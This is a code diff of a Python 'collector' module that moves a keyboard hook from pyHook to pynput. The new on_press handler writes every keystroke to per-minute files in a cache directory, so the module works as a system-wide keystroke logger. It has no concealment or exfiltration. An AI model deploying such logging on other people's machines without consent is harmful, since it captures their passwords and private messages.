@@ -1,41 +1,35 @@
 # _*_ coding:utf-8 _*_
 
 import os
-import time
-import datetime
-import pyHook
-import pythoncom
-from collector.utils import config
+
+from pynput import keyboard
+from collector.utils import common
+
+__TASK__ = 'KEYBOARD'
+cache_dir = common.get_cache_dir(sub_name=__TASK__)
 
 
-def get_time_info(fmt=None):
-    timestamp = int(time.time())
-    dt_str = None
-    if fmt:
-        dt = datetime.datetime.fromtimestamp(timestamp)
-        dt_str = dt.strptime(fmt)
-    return timestamp, str(dt_str)
+def on_press(key):
+    try:
+        _, dt_str = common.get_time_info(fmt="%Y-%m-%d-%H-%M")
+        save_path = os.path.join(cache_dir, dt_str)
+        with open(save_path, 'a') as fd:
+            fd.write(str(key) + '\n')
+    except AttributeError:
+        pass
 
 
-def get_cache_dir():
-    name = 'keyboard'
-    path = os.path.join(config.CACHE_DIR, name)
-    if not os.path.exists(path):
-        os.makedirs(path)
-    return path
-
-
-def on_keyboard_event(event):
-    timestamp, dt_str = get_time_info(fmt="%Y-%m-%d-%H-%M")
-    save_path = os.path.join(get_cache_dir(), dt_str)
-    with open(save_path, 'a', newline='\r\n') as fd:
-        message = str(timestamp) + str(event.Key)
-        fd.write(message)
-    return True
+def on_release(key):
+    print('released key: {0}'.format(key))
 
 
 def run():
-    hook = pyHook.HookManager()
-    hook.KeyDown = on_keyboard_event
-    hook.HookKeyboard()
-    pythoncom.PumpMessages()
+    keyboard_listener = keyboard.Listener(on_press=on_press)
+    keyboard_listener.start()
+    keyboard_listener.join()
+
+
+if __name__ == '__main__':
+    k = keyboard.Listener(on_press=on_press)
+    k.start()
+    k.join()
